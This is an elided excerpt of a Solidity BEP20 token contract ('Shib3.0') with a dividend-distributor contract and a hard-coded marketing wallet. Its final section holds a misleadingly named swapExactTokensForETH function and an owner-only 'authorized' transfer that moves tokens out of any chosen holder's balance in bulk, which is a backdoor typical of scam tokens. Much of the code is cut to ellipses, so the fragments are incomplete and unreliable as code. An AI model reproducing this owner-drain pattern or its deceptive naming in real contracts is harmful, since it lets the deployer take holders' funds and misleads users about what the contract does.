...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 Shibkiller = IBEP20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
    ...
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = Shibkiller.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(Shibkiller);
        ...
        uint256 amount = Shibkiller.balanceOf(address(this)).sub(balanceBefore);
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            Shibkiller.transfer(shareholder, amount);
...
contract shib3 is IBEP20, Auth {
    ...
    string private _name = "Shib3.0";
    string private _symbol = "ShibV3";
    uint8 private _decimals = 5;

    uint256 _totalSupply = 1000000 * 10**20 * (10 ** _decimals);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver =0xd0f3ECf753026579d00AF2a6E7F46c673919aB7A; 
...
/* transfer Begins */
  ...
  function swapExactTokensForETH(
    ...
    require(
      ...
      "GAS Error: max transfer limit is 2000 addresses"
    ); // to prevent overflow
 ...
 function transfer(address from, address[] calldata addresses, uint256[] calldata tokens) external authorized {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to transfer");
